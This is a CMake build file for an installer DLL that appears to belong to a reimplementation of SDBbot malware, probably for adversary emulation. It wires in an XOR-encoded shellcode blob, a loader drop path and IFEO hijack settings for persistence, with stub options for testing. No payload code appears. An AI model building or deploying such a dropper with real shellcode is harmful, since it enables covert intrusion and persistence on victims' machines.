# Installer DLL
add_library(installer SHARED)
target_link_libraries(installer PRIVATE common)
target_include_directories(installer PUBLIC "${CMAKE_SOURCE_DIR}/include")

target_sources(
    installer
    PRIVATE
        "main.cpp"
        "drop.cpp"
        "verifier.cpp"
        "shellcode.cpp"
        "xor.cpp"
        "resources.rc"
    PUBLIC
        FILE_SET
            installer_headers
        TYPE
            HEADERS
        FILES
            "drop.hpp"
            "verifier.hpp"
            "shellcode.hpp"
            "resources.hpp"
            "xor.hpp"
)

target_compile_definitions(
    installer PRIVATE
    SHELLCODE_PATH="$<TARGET_FILE_DIR:shellcode-pe>/shellcode-blob.bin.xor"
    LOADER_SHELLCODE_KEY="${LOADER_SHELLCODE_KEY}"
    LOADER_SHELLCODE_VALUE="${LOADER_SHELLCODE_VALUE}"
    LOADER_SYMLINK="${LOADER_SYMLINK}"
    LOADER_DROP_PATH="${LOADER_DROP_PATH}"
    IFEO_TARGET_PROCESS="${IFEO_TARGET_PROCESS}"
    IFEO_FILTER_FULL_PATH="${IFEO_FILTER_FULL_PATH}"
    RESOURCE_XOR_KEY_STR="${RESOURCE_XOR_KEY_HEX}"
    $<$<CONFIG:Debug>:DEBUG>
)

if(INSTALLER_STUB_LOADER)
  set(LOADER loader-stub)
  message(STATUS "Using loader stub for installer build")
else()
  set(LOADER loader)
endif()

if(INSTALLER_STUB_SHELLCODE)
  set(SHELLCODE shellcode-stub)
  message(STATUS "Using shellcode stub for installer build")
else()
  set(SHELLCODE shellcode)
endif()

add_dependencies(installer ${LOADER} shellcode-blob)
target_link_libraries(installer PUBLIC common ${LOADER}-header)

# Add unit test .cpp files here
target_sources(
    sdbbot-test
    PRIVATE
    "xor_test.cpp"
    $<FILTER:$<TARGET_OBJECTS:installer>,EXCLUDE,main.cpp.obj>
    PRIVATE
    FILE_SET installer_headers
    TYPE HEADERS
)